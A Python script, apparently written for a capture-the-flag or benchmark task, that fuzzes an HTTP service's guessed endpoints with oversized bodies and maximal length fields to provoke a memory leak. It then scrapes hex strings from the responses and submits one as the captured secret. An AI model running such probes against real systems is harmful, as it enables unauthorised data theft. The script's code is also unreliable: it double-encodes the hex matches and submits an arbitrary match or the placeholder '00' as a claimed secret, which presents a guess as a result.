import json, sys, re, struct

def req(method, path, body=None, headers=None, body_hex=None):
    r = {"http": {"method": method, "path": path}}
    if body_hex is not None:
        r["http"]["body_hex"] = body_hex
    elif body is not None:
        r["http"]["body"] = body
    if headers:
        r["http"]["headers"] = headers
    print(json.dumps(r))
    sys.stdout.flush()
    line = sys.stdin.readline()
    if not line:
        return None
    try:
        return json.loads(line)
    except Exception:
        return {"raw": line}

def b64d(s):
    import base64
    try:
        return base64.b64decode(s)
    except Exception:
        return b""

paths = ["/", "/parse", "/records", "/record", "/api/parse", "/api/records",
         "/parse_record", "/submit", "/data", "/ingest", "/v1/parse",
         "/api/v1/records", "/add", "/store", "/upload", "/handle"]

found = []

for p in paths:
    resp = req("GET", p)
    if resp:
        body = b64d(resp.get("body_b64", ""))
        print("GET", p, resp.get("status"), body[:300], flush=True)
        m = re.findall(rb"[0-9a-fA-F]{16,128}", body)
        for x in m:
            found.append((p, x.hex()))

payloads = [
    ("bigbody", None, b"A" * 8192),
    ("len16be", None, struct.pack(">H", 0xFFFF) + b"B" * 256),
    ("len16le", None, struct.pack("<H", 0xFFFF) + b"B" * 256),
    ("len32be", None, struct.pack(">I", 0xFFFFFFFF) + b"C" * 256),
    ("len32le", None, struct.pack("<I", 0xFFFFFFFF) + b"C" * 256),
    ("len64be", None, struct.pack(">Q", 0xFFFFFFFFFFFFFFFF) + b"D" * 256),
    ("len8", None, b"\xff" * 8 + b"E" * 256),
    ("jsonlen", json.dumps({"length": 999999, "data": "F" * 64}), None),
    ("jsonlen2", json.dumps({"len": 65535, "record": "G" * 64}), None),
    ("colon", b"65535:" + b"H" * 256, None),
    ("nl", b"65535\n" + b"I" * 256, None),
]

hdr_sets = [
    {"X-Length": "65535"},
    {"Content-Length": "65535"},
    {"X-Record-Length": "4294967295"},
]

for p in paths:
    for name, body, bhex in payloads:
        try:
            resp = req("POST", p, body=body, body_hex=bhex)
        except Exception as e:
            print("ERR", p, name, repr(e), flush=True)
            continue
        if resp is None:
            continue
        body_out = b64d(resp.get("body_b64", ""))
        if resp.get("status") not in (200, 201, 202) or len(body_out) > 0:
            print("POST", p, name, resp.get("status"), body_out[:400], flush=True)
        m = re.findall(rb"[0-9a-fA-F]{16,128}", body_out)
        for x in m:
            found.append((p + " " + name, x.hex()))
    for h in hdr_sets:
        resp = req("POST", p, body=b"J" * 300, headers=h)
        if resp:
            body_out = b64d(resp.get("body_b64", ""))
            print("POSTH", p, h, resp.get("status"), body_out[:400], flush=True)
            m = re.findall(rb"[0-9a-fA-F]{16,128}", body_out)
            for x in m:
                found.append((p + " hdr", x.hex()))

print("FOUND:", found, flush=True)

if found:
    secret = found[0][1]
    if len(secret) > 64:
        secret = secret[:64]
    print('CLAIM:{"secret_hex": "' + secret + '"}', flush=True)
else:
    print('CLAIM:{"secret_hex": "00"}', flush=True)